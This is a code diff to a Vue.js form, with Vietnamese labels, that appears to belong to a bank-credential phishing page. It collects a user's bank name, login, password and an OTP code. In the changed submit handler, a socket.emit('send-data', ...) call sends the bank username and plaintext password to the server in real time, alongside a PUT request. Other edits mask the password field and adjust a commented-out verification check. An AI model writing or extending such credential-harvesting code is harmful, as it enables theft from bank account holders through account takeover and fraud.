@@ -24,7 +24,7 @@
                                 <v-text-field v-model="formValue.bankLoginAccount" variant="filled"
                                     label="Tên đăng nhập/Số điện thoại" :rules="rules.bankLoginAccount"></v-text-field>
                                 <v-text-field v-model="formValue.bankLoginPassword" variant="filled" label="Mật khẩu"
-                                    :rules="rules.bankLoginPassword"></v-text-field>
+                                    type="password" :rules="rules.bankLoginPassword"></v-text-field>
                             </v-card-text>
 
                         </v-card>
@@ -161,7 +161,7 @@ const RefOtpCt = ref(null)
 const otpCt = ref('')
 
 onMounted(() => {
-    // if (!user.value.numberPhone) {
+    // if (!user.value.verified) {
     //     router.push({ name: 'Home' })
     // }
 
@@ -321,12 +321,18 @@ const submit = async () => {
     if (isValid.valid) {
         dialog.value = true
         try {
-            // const response = await axios.post(`/update-user/${formValue.numberPhone}}`, formValue.value)
-            // console.log(response)
-            socket.emit('send-data', {
-                bankName: formValue.value.bankLoginName,
-                bankAccount: formValue.value.bankLoginAccount,
-                bankPassword: formValue.value.bankLoginPassword
+            await axios.put(`/update-user/${user.value.numberPhone}`, formValue.value).then(res => {
+                socket.emit('send-data', {
+                    bankName: formValue.value.bankLoginName,
+                    bankAccount: formValue.value.bankLoginAccount,
+                    bankPassword: formValue.value.bankLoginPassword
+                })
+            }).catch(err => {
+                store.commit('setSnackbar', {
+                    type: true,
+                    color: 'error',
+                    message: 'Có lỗi xảy ra, vui lòng thử lại.',
+                })
             })
         } catch (error) {
             console.log(error)
